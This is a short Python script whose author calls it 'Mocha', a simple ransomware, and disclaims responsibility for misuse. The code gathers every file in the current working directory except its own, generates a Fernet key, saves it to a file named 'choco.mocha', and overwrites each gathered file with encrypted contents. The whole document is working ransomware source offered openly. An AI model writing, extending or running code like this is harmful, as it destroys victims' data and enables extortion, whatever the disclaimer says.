import os

from cryptography.fernet import Fernet

# Mocha is a simple (for now) Ransomware.
# IMPROPER USE OF THIS CODE IS NOT MY RESPONSABILITY!

files = []

# cwd stands for Current Working Directory
for file in os.listdir():
    if file == "mocha.py" or file == "choco.mocha" or file == "cappuccino.py":
        continue
    else: files.append(file)

print(files)

# Encryption key!
key = Fernet.generate_key()

# File containing decryption key
mocha = open("choco.mocha", "x")
with open("choco.mocha", "wb") as mochaContent:
    mochaContent.write(key)

# Write encrypted text to file
for file in files:
    with open(file, "rb") as openedFile:
        # Gets all data from file
        contents = openedFile.read()
    encrypt = Fernet(key).encrypt(contents)
    with open(file, "wb") as writeFile:
        writeFile.write(encrypt)
